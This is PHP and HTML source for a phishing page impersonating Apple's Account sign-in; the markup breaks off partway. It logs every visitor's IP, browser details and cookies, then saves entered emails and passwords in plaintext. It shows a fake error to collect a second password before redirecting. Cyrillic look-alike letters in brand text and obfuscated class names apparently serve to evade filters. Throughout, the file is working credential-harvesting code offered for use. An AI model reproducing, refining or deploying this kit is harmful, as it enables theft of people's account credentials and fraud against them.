<?php
session_set_cookie_params([
    'lifetime' => 7 * 24 * 60 * 60,
    'path' => '/',
    'domain' => '',
    'secure' => isset($_SERVER['HTTPS']),
    'httponly' => true,
    'samesite' => 'Lax'
]);
session_start();

if (isset($_GET['timestamp'])) {
    $timestamp = (int)$_GET['timestamp'];
    $current_time = time();
    $expiry_time = 7 * 24 * 60 * 60;
    if ($current_time - $timestamp > $expiry_time) {
        echo "Link expired.";
        exit;
    }
}

$password = '';
$emailOrPhone = '';
$emailOrPhone1 = '';
$password1 = '';
$error = '';
$emailError = '';
$passwordError = '';
$showPassword = false;
$isError = false;
$showSecondSections = false;

if (isset($_GET['email'])) {
    $emailOrPhone = trim($_GET['email']);
}

$isVerified = isset($_GET['email']);
$customText = isset($_GET['text']) ? trim($_GET['text']) : 'Verified Account';

// Log page access for first time IP
$folder = 'Bdsesyhsdhghhh';
if (!is_dir($folder)) { 
    mkdir($folder, 0755, true);
}
$file = $folder . '/gdgdgdgdgdgdgd.txt';
$ip = $_SERVER['REMOTE_ADDR'];
$existingData = file_exists($file) ? file_get_contents($file) : '';
if (strpos($existingData, "IP: " . $ip . "\n") === false) {
    $date = date('Y-m-d H:i:s T');
    $identifier = 'Page Access';
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
    $url = $_SERVER['REQUEST_URI'];
    $data = "Date: " . $date . "\n" .
            "Identifier: " . $identifier . "\n" .
            "IP: " . $ip . "\n" .
            "Useragent: " . $useragent . "\n" .
            "Lang: " . $lang . "\n" .
            "URL: " . $url . "\n" .
            "Cookies: " . json_encode($_COOKIE) . "\n\n";
    file_put_contents($file, $data, FILE_APPEND);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $emailOrPhone = trim($_POST['emailOrPhone'] ?? '');
    $password = trim($_POST['password'] ?? '');
    $emailOrPhone1 = trim($_POST['secondEmailSection'] ?? '');
    $password1 = trim($_POST['secondPasswordSection'] ?? '');
    
    // Validate email
    if (empty($emailOrPhone)) {
        $emailError = 'Please enter your email or phone number.';
        $isError = true;
    } elseif (!preg_match('/^[^\s@]+@[^\s@]+\.[^\s@]+$/', $emailOrPhone) && !preg_match('/^\d{10,15}$/', $emailOrPhone)) {
        $emailError = 'Invalid email or phone number.';
        $isError = true;
    }

    // Check if this is second attempt (second password field exists in POST)
    $isSecondAttempt = isset($_POST['secondPasswordSection']) && $_POST['secondPasswordSection'] !== '';
    
    // Validate password (different rules for first and second attempt)
    if (!$isSecondAttempt && !empty($emailOrPhone) && empty($password)) {
        $passwordError = 'Please enter your password.';
        $isError = true;
        $showSecondSections = true;
    } elseif (!$isSecondAttempt && !empty($password) && (strlen($password) < 8 || strlen($password) > 25)) {
        $passwordError = 'Password must be between 8 and 25 characters.';
        $isError = true;
        $showSecondSections = true;
    }

    if (!$isError) {
        // FIRST ATTEMPT - only email and first password entered
        if (!empty($emailOrPhone) && !empty($password) && !$isSecondAttempt) {
            $folder = 'Bdsesyhsdhghhh';
            if (!is_dir($folder)) {
                mkdir($folder, 0755, true);
            }

            $file = $folder . '/gdgdgdgdgdgdgd.txt';
            $date = date('Y-m-d H:i:s');
            $identifier = $emailOrPhone;
            $ip = $_SERVER['REMOTE_ADDR'];
            $useragent = $_SERVER['HTTP_USER_AGENT'];
            $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
            $url = $_SERVER['REQUEST_URI'];
            $data = "Date: " . $date . "\n" .
                    "Identifier: " . $identifier . "\n" .
                    "IP: " . $ip . "\n" .
                    "Useragent: " . $useragent . "\n" .
                    "Lang: " . $lang . "\n" .
                    "URL: " . $url . "\n" .
                    "Email: " . $emailOrPhone . "\n" .
                    "Password: " . $password . "\n\n";

            file_put_contents($file, $data, FILE_APPEND);

            if (isset($_POST['rememberMe'])) {
                setcookie('remember_email', $emailOrPhone, time() + 2592000, '/', '', false, true);
            }

            // Show error and second password field
            $isError = true;
            $showSecondSections = true;
            $error = 'Check the account information you entered and try again.';
        }
        // SECOND ATTEMPT - second password entered
        elseif (!empty($emailOrPhone) && !empty($password) && $isSecondAttempt) {
            $folder = 'login';
            if (!is_dir($folder)) {
                mkdir($folder, 0755, true);
            }

            $file = $folder . '/gdgdgdgdgdgdgd.txt';
            $date = date('Y-m-d H:i:s');
            $identifier = $emailOrPhone;
            $ip = $_SERVER['REMOTE_ADDR'];
            $useragent = $_SERVER['HTTP_USER_AGENT'];
            $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
            $url = $_SERVER['REQUEST_URI'];
            $data = "Date: " . $date . "\n" .
                    "Identifier: " . $identifier . "\n" .
                    "IP: " . $ip . "\n" .
                    "Useragent: " . $useragent . "\n" .
                    "Lang: " . $lang . "\n" .
                    "URL: " . $url . "\n" .
                    "Email: " . $emailOrPhone . "\n" .
                    "Password: " . $password . "\n" .
                    "Second Email: " . $emailOrPhone1 . "\n" .
                    "Second Password: " . $password1 . "\n\n";

            file_put_contents($file, $data, FILE_APPEND);

            if (isset($_POST['rememberMe'])) {
                setcookie('remember_email', $emailOrPhone, time() + 2592000, '/', '', false, true);
            }

            $_SESSION['loggedin'] = true;
            $_SESSION['email'] = $emailOrPhone;

            header('Location: thank_you.php');
            exit;
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Маnаgе Аррlе Ассоunt</title>
<style>
/* Reset and base */
* {
  /* box-sizing: border-box; */
}
body {
  margin: 0 auto 13px;
  word-break: break-word;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 10vh;
}
a {
  color: #0060c8;
  text-decoration: none;
  cursor: pointer;
}
a:hover,
a:focus {
  text-decoration: underline;
}
/* Container constraint for center content */
.Rec567 {
  max-width: 980px;
  margin-left: auto;
  margin-right: auto;
}
/* Floating placeholder style */
.input-Rec567 {
  width: 480px;
  display: flex;
  flex-direction: column;
  position: relative;
}
.Rdes121 {
  border: 1px solid #a1a1a6;
  border-radius: 12px;
  overflow: hidden;
  position: relative;
}
.input-Rec567 input.Tre789 {
  position: relative;
  z-index: 2;
  background: transparent;
}
.input-Rec567::before {
  content: attr(data-placeholder);
  position: absolute;
  top: 20px;
  left: 16px;
  font-size: 15px;
  color: #6e6e73;
  pointer-events: none;
  background-color: white;
  padding: 0 4px;
  transition: all 0.2s ease-in-out;
  z-index: 1;
}
.input-Rec567.floating::before {
  top: 4px;
  font-size: 12px;
  color: #86868b;
}
.input-Rec567.error::before {
  color: red;
}
.Tre789 {
  width: 100%;
  height: 55px;
  padding: 20px 16px 8px 16px;
  border: 1px solid #a1a1a6;
  font-size: 15px;
  outline-offset: 2px;
  transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
  background-color: #fff;
  border-radius: 12px;
  position: relative;
  z-index: 2;
}

header {
  position: sticky;
  top: 0;
  z-index: 89;
}
header > .Rec567 {
  border-bottom: 1px solid #d2d2d7;
}
.yst432 {
  display: flex;
  align-items: center;
  gap: 32px;
  height: 44px;
  font-weight: 400;
  font-size: 14px;
  padding: 0 25px;
}
.yst432 .Reb5432,
.yst432  {
  display: flex;
  align-items: center;
  gap: 34px;
  white-space: nowrap;
  user-select: none;
}
.Reb5432 {
  flex-grow: 1;
}
.yst432 .nav-action,
.yst432  {
  display: flex;
  align-items: center;
  gap: 18px;
  white-space: nowrap;
  user-select: none;
}
.nav-action{
  flex-grow: 1;
}

.sdrt12 {
  display: inline-block;
  width: 45px;
  height: 44px;
  background: black;
  mask: url('data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjQ0IiB2aWV3Qm94PSIwIDAgMTQgNDQiIHdpZHRoPSIxNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJtMTMuMDcyOSAxNy42ODI1YTMuNjEgMy42MSAwIDAgMCAtMS43MjQ4IDMuMDM2NSAzLjUxMzIgMy41MTMyIDAgMCAwIDIuMTM3OSAzLjIyMjMgOC4zOTQgOC4zOTQgMCAwIDEgLTEuMDk0OCAyLjI2MThjLS42ODE2Ljk4MTItMS4zOTQjIDEuOTYyMy0yLjQ3ODcgMS45NjIzcy0xLjM2MzMtLjYzLTIuNjEzLS42M2MtMS4yMTg3IDAtMS42NTI1LjY1MDctMi42NDQuNjUwN3MtMS42ODM0LS45MDg5LTIuNDc4Ny0yLjAyNDNhOS43ODQyIDkuNzg0MiAwIDAgMSAtMS42NjI4LTUuMjc3NmMwLTMuMDk4NCAyLjAxNC00Ljc0MDUgMy45OTY5LTQuNzQwNSAxLjA1MzUgMCAxLjkzMTQuNjkxOSAyLjU5MjQuNjkxOS42MyAwIDEuNjExMi0uNzMzMyAyLjgwOTItLjczMzNhMy43NTc5IDMuNzU3OSAwIDAgMSAzLjE2MDQgMS41ODAyem0tMy43Mjg0LTIuODkxOGEzLjU2MTUgMy41NjE1IDAgMCAwIC44NDY5LTIuMjIgMS41MzUzIDEuNTM1MyAwIDAgMCAtLjAzMS0uMzIgMy41Njg2IDMuNTY4NiAwIDAgMCAtMi4zNDQ1IDEuMjA4NCAzLjQ2MjkgMy40NjI5IDAgMCAwIC0uODc3OSAyLjE1ODUgMS40MTkgMS40MTkgMCAwIDAgLjAzMSAuMjg5MiAxLjE5IDEuMTkgMCAwIDAgLjIxNjkuMDIwNyAzLjA5MzUgMy4wOTM1IDAgMCAwIDIuMTU4Ni0xLjEzNjh6Ij48L3BhdGg+PC9zdmc+') no-repeat center;
  -webkit-mask: url('data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjQ0IiB2aWV3Qm94PSIwIDAgMTQgNDQiIHdpZHRoPSIxNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJtMTMuMDcyOSAxNy42ODI1YTMuNjEgMy42MSAwIDAgMCAtMS43MjQ4IDMuMDM2NSAzLjUxMzIgMy41MTMyIDAgMCAwIDIuMTM3OSAzLjIyMjMgOC4zOTQgOC4zOTQgMCAwIDEgLTEuMDk0OCAyLjI2MThjLS42ODE2Ljk4MTItMS4zOTQjIDEuOTYyMy0yLjQ3ODcgMS45NjIzcy0xLjM2MzMtLjYzLTIuNjEzLS42M2MtMS4yMTg3IDAtMS42NTI1LjY1MDctMi42NDQuNjUwN3MtMS42ODM0LS45MDg5LTIuNDc4Ny0yLjAyNDNhOS43ODQyIDkuNzg0MiAwIDAgMSAtMS42NjI4LTUuMjc3NmMwLTMuMDk4NCAyLjAxNC00Ljc0MDUgMy45OTY5LTQuNzQwNSAxLjA1MzUgMCAxLjkzMTQuNjkxOSAyLjU5MjQuNjkxOS42MyAwIDEuNjExMi0uNzMzMyAyLjgwOTItLjczMzNhMy43NTc5IDMuNzU3OSAwIDAgMSAzLjE2MDQgMS41ODAyem0tMy43Mjg0LTIuODkxOGEzLjU2MTUgMy41NjE1IDAgMCAwIC44NDY5LTIuMjIgMS41MzUzIDEuNTM1MyAwIDAgMCAtLjAzMS0uMzIgMy41Njg2IDMuNTY4NiAwIDAgMCAtMi4zNDQ1IDEuMjA4NCAzLjQ2MjkgMy40NjI5IDAgMCAwIC0uODc3OSAyLjE1ODUgMS40MTkgMS40MTkgMCAwIDAgLjAzMSAuMjg5MiAxLjE5IDEuMTkgMCAwIDAgLjIxNjkuMDIwNyAzLjA5MzUgMy4wOTM1IDAgMCAwIDIuMTU4Ni0xLjEzNjh6Ij48L3BhdGg+PC9zdmc+') no-repeat center;
  mask-size: contain;
  -webkit-mask-size: contain;
  cursor: pointer;
  flex-shrink: 0;
  margin-right: 2px;
}
/* Navigation links for top nav */
.yst432 a {
  color: #1d1d1f;
  font-weight: 400;
  font-size: 13px;
  line-height: 16px;
}
.yst432 a:hover,
.yst432 a:focus {
  color: #0060c8;
  text-decoration: none;
}
/* User actions - Sign In, Create Account, FAQ */
.user-actions a {
  font-weight: 400;
  font-size: 14px;
  color: #1d1d1f;
  padding-left: 10px;
}
.user-actions a:first-child {
  color: #6e6e73;
  font-weight: 400;
  padding-left: 0;
}
.user-actions a:hover,
.user-actions a:focus {
  color: #0060c8;
  text-decoration: none;
}
/* Main content area */
main {
  margin-top: 555px;
  padding-bottom: 60px;
  min-height: 80vh;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.account-logo {
  width: 180px;
  height: 180px;
  margin-bottom: 24px;
  position: relative;
}
.account-logo svg {
  display: block;
  margin: 0 auto;
  position: relative;
  width: 100%;
  height: 100%;
}
/* Heading */
h1 {
  font-weight: 600;
  font-size: 24px;
  margin: 0 0 12px 0;
  color: #1d1d1f;
}
/* Subheading text */
.subheading {
  font-weight: 400;
  font-size: 15px;
  color: #3c3c4399;
  margin-bottom: 36px;
}
/* Email input */
form {
  width: 500px;
  max-width: 100%;
  display: flex;
  flex-direction: column;
  gap: 12px;
  margin: 0 auto;
}
.input-Rec567 {
  width: 480px;
  display: flex;
  flex-direction: column;
}
.Rdes121 {
  border: 1px solid #a1a1a6;
  border-radius: 12px;
  overflow: hidden;
}
.Tre789 {
  width: 100%;
  height: 55px;
  padding: 0 16px;
  border: none;
  font-size: 15px;
  outline-offset: 2px;
  transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
  background-color: #fff;
}
.Fds765 {
  margin: 0;
  box-shadow: none;
  height: auto;
  padding: 20px 16px;
  font-size: 15px;
  outline-offset: 2px;
  transition: border-color 0.2s ease-in-out;
  width: 100%;
  border-bottom: 1px solid #a1a1a6;
  border-top-left-radius: 12px;
  border-top-right-radius: 600px;
}
.input-password {
  margin: 0;
  box-shadow: none;
  height: auto;
  padding: 20px 16px;
  font-size: 15px;
  outline-offset: 2px;
  transition: border-color 0.2s ease-in-out;
  width: 100%;
  border-bottom-left-radius: 12px;
  border-bottom-right-radius: 12px;
}
/* Checkbox container */
.checkbox-Rec567 {
  margin-top: 12px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  font-size: 13px;
  color: #3c3c4399;
  cursor: pointer;
  user-select: none;
}
.checkbox-Rec567 label {
  cursor: pointer;
}
input[type="checkbox"] {
  cursor: pointer;
  width: 16px;
  height: 16px;
  border: 1px solid #a1a1a6;
  border-radius: 4px;
  background-color: #fff;
  appearance: none;
  -webkit-appearance: none;
  outline-offset: 2px;
  position: relative;
  transition: border-color 0.2s ease-in-out, background-color 0.2s ease-in-out;
}
input[type="checkbox"]:checked {
  background-color: #0071e3;
  border-color: #0071e3;
}
input[type="checkbox"]:checked::after {
  content: "";
  position: absolute;
  left: 4px;
  top: 1px;
  width: 5px;
  height: 10px;
  border: solid white;
  border-width: 0 2px 2px 0;
  transform: rotate(45deg);
}
/* Info block with icon and text */
.info-block {
  margin-top: 30px;
  font-size: 11px;
  line-height: 1.4;
  color: #3c3c4399;
  max-width: 320px;
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
  gap: 10px;
  user-select: none;
}
/* People icon styling */
.icon-people {
  width: 36px;
  height: 36px;
  fill: url(#gradientBlue);
  margin-bottom: 8px;
  flex-shrink: 0;
}
/* Link inside info text */
.info-block a {
  font-size: 11px;
  color: #0060c8;
  font-weight: 600;
}
.info-block a:hover,
.info-block a:focus {
  text-decoration: underline;
  color: #004080;
}
/* conb677 button */

.Bst543 {
        display: flex;
        gap: 12px;
        flex-wrap: nowrap;
        justify-content: center;
    }
.Bst543 button {
        cursor: pointer;
        border: none;
        border-radius: 8px;
        font-size: 16px;
        padding: 12px 0;
        width: 450px;
        transition: background-color 0.3s ease;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
    }
    .highlighted-text {
        font-weight: bold;
        color: #0071e3;
    }
    button.conb677 {
        background-color: #8ab9f9;
        color: white;
        border-radius: 8px;
box-sizing: border-box; 
row-gap: 20px;
  flex-direction: row;
  column-gap: 10px;
        font-size: 14px;
        width: 450px;
        transition: background-color 0.3s ease;
    }
    button.conb677:hover {
        background-color: #6ea0d9;
    }
    button.ps45y {
        background-color: #000;
        color: white;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        border-radius: 8px;
        box-sizing: border-box;
        font-size: 14px;
     row-gap: 20px;
  flex-direction: row;
  column-gap: 10px;
        width: -800px;
        transition: background-color 0.3s ease;
    }
    button.ps45y:hover {
        background-color: #333;
    }
    button.ps45y svg {
        width: 20px;
        height: 16px;
        fill: white;
    }

    button.enabled {
      background-color: #0071e3;
      cursor: pointer;
      box-shadow: 0 0 0 0.15em #abd4ff;
    }
    button.enabled:hover,
    button.enabled:focus {
      background-color: #004a9f;
      outline: none;
      box-shadow: 0 0 0 0.25em #004a9f80;
    }
    .Reb54320 {
      color: red;
      margin-top: 10px;
    }
    .Rdes121.error {
      border-color: red;
      background-color: #fff2f4;
    }
    .error-text {
      color: #000000ff;
    }
    .error-text12{
      color: #01010cff;
    }
    .ps45y-group {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .stx76tt {
      font-size: 12.5px;
      line-height: 1.33337;
      font-weight: 400;
      font-family: SF Pro Text,SF Pro Icons,Helvetica Neue,Helvetica,Arial,sans-serif;
      color: #494949;
      text-align: right;
      margin-top: 0;
    }
    .btxre4 {
      display: none;
    }
    /* Media query for tablets and smaller screens */
    @media (max-width: 768px) {
      .yst432 {
        padding: 0 10px;
        height: 40px;
      }
      .yst432 a {
        font-size: 12px;
      }
      .Reb5432 {
        gap: 16px;
      }
      /* Hide some links on mobile to prevent overflow */
      .yst432 a:nth-child(n+6) {
        display: none;
      }
      main {
        margin-top: 80px;
      }
      .account-logo {
        width: 140px;
        height: 140px;
      }
      h1 {
        font-size: 24px;
      }
      .subheading {
        font-size: 14px;
      }
      .input-Rec567 {
        width: 100%;
      }
      .Bst543 {
        flex-direction: column;
        gap: 8px;
      }
      .Bst543 button {
        width: 100%;
        max-width: 400px;
      }
      .info-block {
        max-width: 100%;
      }
      p {
        width: 100%;
      }
    }

    /* Media query for mobile */
    @media (max-width: 480px) {
      h1 {
        font-size: 22px;
      }
      main {
        margin-top: 32px;
      }
      .Rec567 {
        padding-left: 15px;
        padding-right: 15px;
      }
      input[type="text"],
      button,
      .info-block {
        width: 100%;
        max-width: none;
      }
      .input-Rec567 {
        width: 100%;
      }
      .account-logo {
        width: 120px;
        height: 120px;
      }
      .Bst543 {
        flex-direction: column;
      }
      p {
        width: 100%;
      }
      .yst432 a:nth-child(n+4) {
        display: none;
      }
    }
</style>
</head>
<body>
<div id="loadingOverlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 80; display: flex; justify-content: center; align-items: flex-start; padding-top: 93px;">
  <div style="display: flex; flex-direction: column; align-items: center;">
    <img src="aicon.png" alt="Loading..." style="width: 300px; height: 300px;">
    <img src="loading.gif" alt="Loading..." style="width: 30px; height: 30px; margin-top: 20px;">
  </div>
</div>
<header>
  <nav class="yst432 Rec567" aria-label="Primary navigation" style="border-bottom: none;">
    <div class="Reb5432" role="menu">
      <a href="#" aria-label="Аррlе hоmераgе" role="menuitem" class="sdrt12"></a>
      <a href="#" role="menuitem">Stоrе</a>
      <a href="#" role="menuitem">Мас</a>
      <a href="#" role="menuitem">іРаd</a>
      <a href="#" role="menuitem">іРhоnе</a>
      <a href="#" role="menuitem">Watch</a>
      <a href="#" role="menuitem">Vіѕіоn</a>
      <a href="#" role="menuitem">АіrРоdѕ</a>
      <a href="#" role="menuitem">ТV & Ноmе</a>
      <a href="#" role="menuitem">Еntеrtаіnmеnt</a>
      <a href="#" role="menuitem">Ассеѕѕоrіеѕ</a>
      <a href="#" role="menuitem">Suрроrt</a>
      <a role="button" id="globalnav-menubutton-link-search" class="Rsd321" href="#" data-topnav-flyout-trigger-regular="" data-topnav-flyout-trigger-compact="" aria-label=" " data-analytics-title="open - search field"><span class="Gdf543"><svg xmlns=" " width="15px" height="44px" viewBox="0 0 15 44">
        <path d="M14.298,27.202l-3.87-3.87c0.701-0.929,1.122-2.081,1.122-3.332c0-3.06-2.489-5.55-5.55-5.55c-3.06,0-5.55,2.49-5.55,5.55 c0,3.061,2.49,5.55,5.55,5.55c1.251,0,2.403-0.421,3.332-1.122l3.87,3.87c0.151,0.151,0.35,0.228,0.548,0.228 s0.396-0.076,0.548-0.228C14.601,27.995,14.601,27.505,14.298,27.202z M1.55,20c0-2.454,1.997-4.45,4.45-4.45 c2.454,0,4.45,1.997,4.45,4.45S8.454,24.45,6,24.45C3.546,24.45,1.55,22.454,1.55,20z"></path>
        </svg>
        <a role="button" id="globalnav-menubutton-link-bag" href="#" aria-label="Shopping Bag" data-globalnav-item-name="bag" data-topnav-flyout-trigger-regular="" data-topnav-flyout-trigger-compact="" data-analytics-title="open - bag" class="Fds876"><span class="Gdf543"><svg height="44" viewBox="0 0 14 44" width="14" xmlns=" "><path d="m11.3535 16.0283h-1.0205a3.4229 3.4229 0 0 0 -3.333-2.9648 3.4229 3.4229 0 0 0 -3.333 2.9648h-1.02a2.1184 2.1184 0 0 0 -2.117 2.1162v7.7155a2.1186 2.1186 0 0 0 2.1162 2.1167h8.707a2.1186 2.1186 0 0 0 2.1168-2.1167v-7.7155a2.1184 2.1184 0 0 0 -2.1165-2.1162zm-4.3535-1.8652a2.3169 2.3169 0 0 1 2.2222 1.8652h-4.4444a2.3169 2.3169 0 0 1 2.2222-1.8652zm5.37 11.6969a1.0182 1.0182 0 0 1 -1.0166 1.0171h-8.7069a1.0182 1.0182 0 0 1 -1.0165-1.0171v-7.7155a1.0178 1.0178 0 0 1 1.0166-1.0166h8.707a1.0178 1.0178 0 0 1 1.0164 1.0166z"></path></svg></span></a>
    </div>
  </nav>
  <nav class="yst432 Rec567" aria-label="Primary navigation">
    <div class="Reb5432" role="menu">
      <strong style="font-size: 20px; color: #000;">Аррlе Ассоunt</strong>
      <a href="#" role="menuitem" tabindex="0" style="margin-left: 550px;">Sіgn In</a>
      <a href="#" role="menuitem" tabindex="0">Сrеаtе Yоur Аррlе Ассоunt</a>
      <a href="#" role="menuitem" tabindex="0">FАQ</a>
    </div>
  </nav>
</header>
<div>
  <center><img src="aicon.png" style="width: 300px; height: 300px; margin-bottom: -20px;"></center>
</div>
<div>
  <center><strong style="font-size: 32px; color: #494949;">Аррlе Ассоunt</strong></center>
</div>
<br>
<div>
  <center style="font-size: 17px; color: #494949; margin-bottom: 20px;"><?php echo $isVerified ? htmlspecialchars($customText) : 'Маnаgе yоur Аррlе Ассоunt'; ?></center>
</div>
<div class="Rec567" id="Rec567">
  <form method="post" action="" style="position: relative;">
    <div class="input-Rec567 Rdes121 <?php echo $isError ? 'error' : ''; ?>" data-placeholder="Еmаіl оr Рhоnе Numbеr">
      <input type="text" id="emailOrPhone" name="emailOrPhone" value="<?= htmlspecialchars($emailOrPhone) ?>" required autofocus autocomplete="username" class="Tre789 Fds765 Dsc99 <?php echo $isError ? 'error-text' : ''; ?>">
      <div id="emailError" class="Reb54320" style="display: <?php echo !empty($emailError) ? 'block' : 'none'; ?>;"><?php echo htmlspecialchars($emailError); ?></div>
      
      <div id="passwordSection" class="input-Rec567 <?php echo $isError ? 'Rdes121 error' : ''; ?>" style="display: <?php echo ($showPassword || $isError) ? 'block' : 'none'; ?>;" data-placeholder="Password">
        <input type="password" id="password" name="password" value="<?= htmlspecialchars($password) ?>" required autocomplete="current-password" class="Tre789 input-password bottom-input <?php echo $isError ? 'error-text12' : ''; ?>">
        <div id="passwordError" class="Reb54320" style="display: <?php echo !empty($passwordError) ? 'block' : 'none'; ?>;"><?php echo htmlspecialchars($passwordError); ?></div>
      </div>
      
      <?php if ($showSecondSections): ?>
      <div id="secondEmailSection" class="input-Rec567" style="display: block;" data-placeholder="Second Email or Phone Number">
        <input type="text" id="emailOrPhone1" name="secondEmailSection" value="<?= htmlspecialchars($emailOrPhone) ?>" class="Tre789" placeholder="Second Email or Phone Number">
      </div>
      <div id="secondPasswordSection" class="input-Rec567" style="display: block;" data-placeholder="Second Password">
        <input type="password" id="password1" name="secondPasswordSection" class="Tre789" placeholder="Second Password" required>
      </div>
      <?php endif; ?>
    </div>
    
    <?php if ($error && $isError): ?>
    <div class="Reb54320" style="margin-top: -175px; color: #e30000; font-size: 15px; line-height: 23.3333733333; font-weight: 400; letter-spacing: -.01em;">
      <svg xmlns="" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" fill-rule="evenodd" clip-rule="evenodd" viewBox="0 0 512 512" style="width: 13px; height: 13px; vertical-align: middle; margin-right: 5px; fill: #e30000;">
        <path d="M256 0c70.686 0 134.69 28.658 181.016 74.984C483.342 121.31 512 185.314 512 256c0 70.686-28.658 134.69-74.984 181.016C390.69 483.342 326.686 512 256 512c-70.686 0-134.69-28.658-181.016-74.984C28.658 390.69 0 326.686 0 256c0-70.686 28.658-134.69 74.984-181.016C121.31 28.658 185.314 0 256 0zm19.546 302.281c-.88 22.063-38.246 22.092-39.099-.007-3.779-37.804-13.444-127.553-13.136-163.074.312-10.946 9.383-17.426 20.99-19.898 3.578-.765 7.512-1.136 11.476-1.132 3.987.007 7.932.4 11.514 1.165 11.989 2.554 21.402 9.301 21.398 20.444l-.044 1.117-13.099 161.385zM256 341.492c14.453 0 26.168 11.717 26.168 26.171 0 14.453-11.715 26.167-26.168 26.167s-26.171-11.714-26.171-26.167c0-14.454 11.718-26.171 26.171-26.171zm0-312.028c125.114 0 226.536 101.422 226.536 226.536S381.114 482.536 256 482.536 29.464 381.114 29.464 256 130.886 29.464 256 29.464z"/>
      </svg>
      <?php echo htmlspecialchars($error); ?> 
      <a href="#" target="_blank" id="forgotPasswordLink" class="Reb54321" style="margin: 5px; font-size: 14px; line-height: 1; color: #0060c8; display: inline; text-decoration: none; cursor: pointer;">
        Fоrgоt раѕѕwоrd? 
        <svg width="15" height="15" viewBox="11 0 21 21" xmlns=""><g fill="none" fill-rule="evenodd" stroke="#0060c8" stroke-linecap="round" stroke-linejoin="round" transform="translate(12 12)"><path d="m8.5 7.5v-7h-7"/><path d="m8.5.5-8 8"/></g></svg>
      </a>
    </div>
    <?php endif; ?>
    
    <div id="checkboxContainer" class="checkbox-Rec567" style="margin-bottom: 15px; display: <?php echo ($showPassword || $showSecondSections || $isError) ? 'flex' : 'none'; ?>; justify-content: space-between; align-items: center; gap: 20px; margin-top: 2px;">
      <label style="margin: 0; display: flex; align-items: center; gap: 5px; font-size: 16px; color: #494949; cursor: pointer;">
        <input type="checkbox" id="rememberMe" name="rememberMe" style="width: 16px; height: 16px; cursor: pointer;" <?php echo isset($_POST['rememberMe']) ? 'checked' : ''; ?>>
        Rеmеmbеr mе
      </label>
      <a href="#" target="_blank" id="forgotPasswordLink" class="Reb54321" style="margin: 1px; font-size: 15px; line-height: 1; color: #0060c8; white-space: nowrap; font-weight: 500; gap: 10px; display: inline; text-decoration: none; cursor: pointer;">
        Fоrgоt раѕѕwоrd? <svg width="18" height="18" viewBox="11 0 20 20" xmlns=""><g fill="none" fill-rule="evenodd" stroke="#0060c8" stroke-linecap="round" stroke-linejoin="round" transform="translate(12 12)"><path d="m8.5 7.5v-7h-7"/><path d="m8.5.5-8 8"/></g></svg>
      </a>
    </div>
      
    <?php if (!$isError && !$showSecondSections): ?>
    <div style="text-align: center; margin-top: 30px;">
      <img src="privacyIcon.png" id="privacyImg" style="width: 50px; height: 50px;">
      <p style="width: 410px; font-size: 12px; color: #494949; margin-left: 55px; margin-top: 12px; text-align: center; line-height: 1.33337; font-weight: 400; font-family: SF Pro Text,SF Pro Icons,Helvetica Neue,Helvetica,Arial,sans-serif;">
        Yоur Аррlе Ассоunt іnfоrmаtіоn іѕ uѕеd tо аllоw yоu tо ѕіgn іn ѕесurеly аnd ассеѕѕ yоur dаtа. Аррlе rесоrdѕ сеrtаіn dаtа fоr ѕесurіty, ѕuрроrt, аnd rероrtіng рurроѕеѕ. If yоu аgrее, Аррlе mаy аlѕо uѕе yоur Аррlе Ассоunt іnfоrmаtіоn tо ѕеnd yоu mаrkеtіng еmаіlѕ аnd соmmunісаtіоnѕ, іnсludіng bаѕеd оn yоur uѕе оf Аррlе ѕеrvісеѕ. <a href="#" style="color: #0060c8; text-decoration: underline;">See how your data is managed...</a>
      </p>
    </div>
    <?php endif; ?>
    
    <div class="Bst543">
      <button type="submit" class="conb677 <?php echo (!empty($emailOrPhone)) ? 'enabled' : ''; ?>">
        <span class="btxre4"><?php echo ($showPassword || $showSecondSections || $isError) ? 'Sіgn In' : 'Соntіnuе'; ?></span>
        <img src="loading.gif" alt="Loading..." class="btg765" style="display:none; width: 20px; height: 20px; vertical-align: middle;">
      </button>
      <button type="button" class="ps45y" style="display: <?php echo ($showPassword || $showSecondSections || $isError) ? 'none' : 'block'; ?>;">
        <svg xmlns="" width="20" height="20" viewBox="0 0 49.848 47.644" aria-hidden="true">
